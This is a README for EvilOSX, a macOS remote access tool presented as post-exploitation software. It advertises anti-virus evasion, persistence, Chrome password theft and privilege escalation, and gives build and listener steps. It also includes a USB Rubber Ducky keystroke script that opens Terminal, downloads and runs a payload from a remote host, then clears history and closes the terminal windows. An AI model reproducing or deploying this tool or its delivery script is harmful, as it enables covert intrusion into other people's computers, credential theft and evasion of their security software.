<h1 align="center">
  <br>
  <img src="modules/evil_rat_by_black_fire_dragoness-d6531uu.jpg" alt="Hack2Gain" width="250">
  <br>
  OSX-RAT
  <br>
</h1>

<h4 align="center">A pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX.</h4>

<p align="center">
  <a href="LICENSE.txt">
      <img src="https://img.shields.io/badge/license-GPLv3-blue.svg">
  </a>
  <img src="https://img.shields.io/badge/contributions-none-orange.svg">
</p>

---

## Features

- Emulate a simple terminal instance
- Undetected by anti-virus (randomized hash, [HTTPS](https://en.wikipedia.org/wiki/HTTPS) communication)
- Multi-threaded
- No dependencies (pure python)
- Persistent
- Simple extendable [module](https://github.com/Marten4n6/EvilOSX/blob/master/modules/template.py) system
- Retrieve Chrome passwords
- Download and upload files
- Attempt to get root via local privilege escalation
- Auto installer, simply run EvilOSX on your target and the rest is handled automatically.

## How To Use

```bash
# Clone or download this repository
$ git clone https://github.com/Marten4n6/EvilOSX

# Go into the repository
$ cd EvilOSX

# Build EvilOSX which runs on your target
$ python builder.py

# Start listening for connections
$ python Server.py

# Lastly, run the built EvilOSX on your target.
```
![](https://i.imgur.com/Ce0V8B4.png)
![](https://i.imgur.com/cWYn7mL.png)

## Motivation

This project was created to be used with my [Rubber Ducky](https://hakshop.com/products/usb-rubber-ducky-deluxe), here's the simple script:
```
REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
REM See https://ducktoolkit.com/vidpid/

DELAY 1000
GUI SPACE
DELAY 500
STRING Termina
DELAY 1000
ENTER
DELAY 1500

REM Kill all terminals after x seconds
STRING screen -dm bash -c 'sleep 6; killall Terminal'
ENTER

STRING cd /tmp; curl -s HOST_TO_EVILOSX.py -o 1337.py; python 1337.py; history -cw; clear
ENTER
```
- Termina**l** is spelt that way intentionally, on some systems spotlight won't find the terminal otherwise. <br/>
- To bypass the keyboard setup assistant make sure you change the VID&PID which can be found [here](https://ducktoolkit.com/vidpid/). <br/>
  Aluminum Keyboard (ISO) is probably the keyboard VID&PID you are looking for.

## Issues

Feel free to submit any issues or feature requests.

## Credits

- Based on the awesome [EmpireProject](https://github.com/EmpireProject)
- [manwhoami](https://github.com/manwhoami) for his awesome projects: [OSXChromeDecrypt](https://github.com/manwhoami/OSXChromeDecrypt), [MMeTokenDecrypt](https://github.com/manwhoami/MMeTokenDecrypt)
- Logo created by [motusora](https://www.behance.net/motusora)

## License

[GPLv3](https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt)
